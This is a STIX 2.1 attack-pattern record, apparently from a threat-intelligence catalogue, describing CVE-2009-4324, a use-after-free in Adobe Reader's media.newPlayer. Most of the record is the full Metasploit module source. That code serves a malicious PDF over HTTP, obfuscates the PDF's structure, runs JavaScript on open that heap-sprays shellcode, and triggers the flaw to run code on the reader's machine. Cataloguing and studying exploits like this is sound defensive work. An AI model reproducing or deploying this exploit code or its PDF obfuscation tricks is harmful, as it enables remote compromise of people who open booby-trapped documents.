{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70e083e8-0267-4c30-9edf-8552bbad25db",
    "created": "2024-08-14T16:44:13.402614Z",
    "modified": "2024-08-14T16:44:13.402618Z",
    "name": "Adobe Doc.media.newPlayer Use After Free Vulnerability",
    "description": " This module exploits a use after free vulnerability in Adobe Reader and Adobe Acrobat Professional versions up to and including 9.2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_media_newplayer.rb",
            "external_id": "adobe_media_newplayer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4324"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb10-02.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Doc.media.newPlayer Use After Free Vulnerability',\n      'Description'    => %q{\n          This module exploits a use after free vulnerability in Adobe Reader and Adobe Acrobat\n        Professional versions up to and including 9.2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'unknown', # Found in the wild\n          # Metasploit version by:\n          'hdm',\n          'pusscat',\n          'jduck',\n          'jabra'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-4324' ],\n          [ 'BID', '37331' ],\n          [ 'OSVDB', '60980' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-02.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'    => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # test results (on Windows XP SP3)\n          # reader 6.0.1 - vulnerable / doesn't work\n          # reader 7.0.5 - untested\n          # reader 7.0.8 - untested\n          # reader 7.0.9 - vulnerable / doesn't work\n          # reader 7.1.0 - untested\n          # reader 7.1.1 - untested\n          # reader 8.0.0 - untested\n          # reader 8.1.1 - works\n          # reader 8.1.2 - untested\n          # reader 8.1.3 - untested\n          # reader 8.1.4 - untested\n          # reader 8.1.5 - untested\n          # reader 8.1.6 - untested\n          # reader 9.0.0 - untested\n          # reader 9.1.0 - works\n          # reader 9.2 - works (no debugger, no DEP)\n          [ 'Adobe Reader Windows English (JS Heap Spray)',\n            {\n              'Size'      => (0x10000/2),\n              'Ret'       => 0x0c0c0c0c\n            }\n          ],\n          [ 'Adobe Reader Windows German (JS Heap Spray)',\n            {\n              'Size'      => (0x10000/2),\n              'Ret'       => 0x0a0a0a0a\n            }\n          ],\n        ],\n      'DisclosureDate' => '2009-12-14',\n      'DefaultTarget'  => 0))\n  end\n\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Make some nops\n    nops      = Rex::Text.to_unescape([target.ret].pack('V'))\n\n    # Randomize variables\n    #\n    len = 72\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(len/2).gsub(/([dhHjmMsty])/m, '\\\\\\\\' + '\\1')\n    rand5  = rand_text_alpha(len/2).gsub(/([dhHjmMsty])/m, '\\\\\\\\' + '\\1')\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    vtbuf = [target.ret].pack('V') * 4\n    vtbuf << rand_text_alpha(len - vtbuf.length)\n    vtbuf.gsub!(/([dhHjmMsty])/m, '\\\\\\\\' + '\\1')\n    retstring  = Rex::Text.to_unescape(vtbuf)\n\n    # The printd strings are 72 bytes (??)\n    script = %Q|\nvar #{randnop} = \"#{nops}\";\nvar #{rand1} = unescape(\"#{shellcode}\");\nvar #{rand2} = unescape(#{randnop});\nvar #{rand3} = unescape(\"#{retstring}\");\nwhile(#{rand2}.length <= #{target['Size']}) #{rand2}+=#{rand2};\n#{rand2}=#{rand2}.substring(0,#{target['Size']} - #{rand1}.length);\nmemory=new Array();\nfor(i=0;i<0x2000;i++) { memory[i]= #{rand2} + #{rand1}; }\nutil.printd(\"#{rand4}\", new Date());\nutil.printd(\"#{rand5}\", new Date());\ntry {this.media.newPlayer(null);} catch(e) {}\nutil.printd(#{rand3}, new Date());\n|\n    # Create the pdf\n    pdf = make_pdf(script)\n\n    print_status(\"Sending #{self.name}\")\n\n    send_response(cli, pdf, { 'Content-Type' => 'application/pdf' })\n\n    handler(cli)\n\n  end\n\n  def random_non_ascii_string(count)\n    result = \"\"\n    count.times do\n      result << (rand(128) + 128).chr\n    end\n    result\n  end\n\n  def io_def(id)\n    \"%d 0 obj\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n  def n_obfu(str)\n    result = \"\"\n    str.scan(/./u) do |c|\n      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n        result << \"#%x\" % c.unpack(\"C*\")[0]\n      else\n        result << c\n      end\n    end\n    result\n  end\n\n  def ascii_hex_whitespace_encode(str)\n    result = \"\"\n    whitespace = \"\"\n    str.each_byte do |b|\n      result << whitespace << \"%02x\" % b\n      whitespace = \" \" * (rand(3) + 1)\n    end\n    result << \">\"\n  end\n\n  def make_pdf(js)\n\n    xref = []\n    eol = \"\\x0d\\x0a\"\n    endobj = \"endobj\" << eol\n\n\n    pdf = \"%PDF-1.5\" << eol\n    pdf << \"%\" << random_non_ascii_string(4) << eol\n    xref << pdf.length\n    pdf << io_def(1) << n_obfu(\"<</Type/Catalog/Outlines \") << io_ref(2) << n_obfu(\"/Pages \") << io_ref(3) << n_obfu(\"/OpenAction \") << io_ref(5) << \">>\" << endobj\n    xref << pdf.length\n    pdf << io_def(2) << n_obfu(\"<</Type/Outlines/Count 0>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(3) << n_obfu(\"<</Type/Pages/Kids[\") << io_ref(4) << n_obfu(\"]/Count 1>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(4) << n_obfu(\"<</Type/Page/Parent \") << io_ref(3) << n_obfu(\"/MediaBox[0 0 612 792]>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(5) << n_obfu(\"<</Type/Action/S/JavaScript/JS \") + io_ref(6) + \">>\" << endobj\n    xref << pdf.length\n    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js))\n    pdf << io_def(6) << n_obfu(\"<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>\" % compressed.length) << eol\n    pdf << \"stream\" << eol\n    pdf << compressed << eol\n    pdf << \"endstream\" << eol\n    pdf << endobj\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n    pdf << \"trailer\" << n_obfu(\"<</Size %d/Root \" % (xref.length + 1)) << io_ref(1) << \">>\" << eol\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n    pdf << \"%%EOF\" << eol\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-12-14",
    "x_mitre_platforms": [
        "win'"
    ]
}